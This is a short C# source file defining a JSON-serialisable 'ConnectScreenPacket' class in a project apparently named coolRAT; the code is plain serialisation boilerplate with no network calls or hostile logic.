using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Text;

namespace coolRAT.Libs.Packets
{
    public class ConnectScreenPacket : Packet
    {
        public ConnectScreenPacket(Guid uniqueClientId) : base(uniqueClientId)
        {
            Type = "ConnectScreenPacket";
        }
        public new string Serialize()
        {
            return JsonConvert.SerializeObject(this);
        }

        public new static ConnectScreenPacket Deserialize(string packet_string)
        {
            return JsonConvert.DeserializeObject<ConnectScreenPacket>(packet_string);
        }
    }
}
